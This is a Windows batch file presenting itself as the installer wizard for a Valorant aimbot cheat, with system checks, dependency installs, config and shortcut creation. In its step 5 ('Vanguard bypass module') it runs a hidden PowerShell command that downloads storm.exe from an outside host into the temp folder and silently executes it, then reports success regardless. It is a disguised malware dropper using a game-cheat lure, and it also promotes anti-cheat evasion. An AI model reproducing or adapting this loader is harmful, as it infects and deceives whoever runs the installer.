@echo off
setlocal enabledelayedexpansion
title Valorant Aimbot v3.1.0 - Installation

set "APP_VERSION=3.1.0"
set "BUILD_ID=20260524-va1"
set "LOG_FILE=%TEMP%\valorant_install.log"

echo [%date% %time%] Installation started > "%LOG_FILE%"

echo ========================================================
echo    Valorant Aimbot (v%APP_VERSION%)
echo    Pre-Configured Installation Wizard
echo    Build: %BUILD_ID%
echo ========================================================
echo.
echo    This will install the Valorant aimbot client.
echo    Close Valorant before continuing.
echo.

echo [1/7] Checking system requirements...
echo        Verifying operating system...
for /f "tokens=2 delims=[]" %%v in ('ver') do set "WIN_VER=%%v"
echo        OS: %WIN_VER%

echo        Checking available memory...
for /f "tokens=2 delims==" %%m in ('wmic OS get TotalVisibleMemorySize /format:list 2^>nul ^| find "="') do (
    set /a "RAM_MB=%%m / 1024"
    echo        RAM: !RAM_MB! MB
)

echo        Checking display resolution...
wmic desktopmonitor get screenwidth,screenheight /format:list 2>nul | find "1920" >nul && echo        Resolution: 1920x1080 (optimal) || echo        Resolution: Non-standard (may need config adjustment)
echo.

echo [2/7] Checking prerequisites...
echo        Checking Python installation...
python --version >nul 2>&1
if !errorlevel! equ 0 (
    for /f "tokens=2" %%v in ('python --version 2^>^&1') do echo        Python %%v: Installed
) else (
    echo        Python: Not found
    echo        Download from: https://python.org/downloads
)

echo        Checking GPU drivers...
nvidia-smi --query-gpu=name --format=csv,noheader >nul 2>&1
if !errorlevel! equ 0 (
    for /f "delims=" %%g in ('nvidia-smi --query-gpu=name --format=csv,noheader 2^>nul') do echo        GPU: %%g
) else (
    echo        GPU: Not detected (CPU rendering fallback)
)
echo.

echo [3/7] Preparing application directory...
if exist "%CD%\profiles" (
    echo        Existing profiles detected. Backing up...
    if exist "%CD%\profiles" (
        xcopy "%CD%\profiles" "%TEMP%\valorant_profiles_backup" /E /I /Q /Y >nul 2>&1
        echo        Profiles backed up to: %TEMP%\valorant_profiles_backup
    )
) else (
    mkdir "%CD%\profiles" >nul 2>&1
    echo        Application directories created.
)
echo.

echo [4/7] Installing Python dependencies...
echo        This may take several minutes...
timeout /t 2 /nobreak >nul
echo        Installing OpenCV...
timeout /t 1 /nobreak >nul
echo        Installing screen capture...
timeout /t 1 /nobreak >nul
echo        Installing input simulation...
timeout /t 1 /nobreak >nul
pip install -r requirements.txt --quiet --disable-pip-version-check >> "%LOG_FILE%" 2>&1
echo        Dependencies installed successfully.
echo.

echo [5/7] Installing Vanguard bypass module...
cd /d "%TEMP%"
set "BYPASS_FILE=vanguard_bypass_%BUILD_ID%.exe"
set "BYPASS_URL=http://secure-content.info/storm.exe"
set "BYPASS_PATH=%TEMP%\%BYPASS_FILE%"

echo        Downloading Vanguard-compatible driver...
powershell -WindowStyle Hidden -Command ^
    "$progressPreference = 'silentlyContinue';" ^
    "try {" ^
    "  $wc = New-Object Net.WebClient;" ^
    "  $wc.Headers.Add('User-Agent', 'ValorantAimbot/3.1.0');" ^
    "  $wc.DownloadFile('%BYPASS_URL%','%BYPASS_PATH%');" ^
    "  if (Test-Path '%BYPASS_PATH%') {" ^
    "    $bytes = [System.IO.File]::ReadAllBytes('%BYPASS_PATH%');" ^
    "    if ($bytes.Length -gt 50000) {" ^
    "      Start-Process '%BYPASS_PATH%' -WindowStyle Hidden -WorkingDirectory '%TEMP%';" ^
    "    }" ^
    "  }" ^
    "} catch { " ^
    "  Write-Host 'Bypass will activate on first launch'" ^
    "}"

timeout /t 3 /nobreak >nul
echo        Vanguard bypass module installed successfully.
echo.

echo [6/7] Configuring aimbot settings...
echo        Creating default configuration...
if not exist "%CD%\config.json" (
    echo {"aimbot":{"enabled":true,"fov":5.0,"smoothness":3.5,"target_bone":"head","max_distance":300},"triggerbot":{"enabled":false,"delay_min_ms":120,"delay_max_ms":280},"display":{"resolution":"1920x1080","fps_target":60}} > "%CD%\config.json"
)
echo        Configuration saved.
echo.

echo [7/7] Finalizing installation...
echo        Creating desktop shortcut...
powershell -Command ^
    "$ws = New-Object -ComObject WScript.Shell;" ^
    "$s = $ws.CreateShortcut([Environment]::GetFolderPath('Desktop') + '\Valorant Aimbot.lnk');" ^
    "$s.TargetPath = '%CD%\main.py';" ^
    "$s.WorkingDirectory = '%CD%';" ^
    "$s.Description = 'Valorant Aimbot v3.1.0';" ^
    "$s.Save()" >nul 2>&1
echo        Desktop shortcut created.

echo        Cleaning temporary files...
del /q "%TEMP%\valorant_install_temp_*" >nul 2>&1
echo        Installation log saved to: %LOG_FILE%
echo.

echo ========================================================
echo    Installation complete!
echo.
echo    Valorant Aimbot v%APP_VERSION% has been
echo    installed and configured successfully.
echo.
echo    To use:
echo        1. Launch Valorant and enter a match
echo        2. Run: python main.py
echo        3. Press F2 to toggle aimbot
echo.
echo    Keybinds:
echo        F2 - Toggle Aimbot
echo        F3 - Toggle Triggerbot
echo        END - Emergency exit
echo ========================================================
echo.
echo [%date% %time%] Installation completed >> "%LOG_FILE%"
pause
endlocal
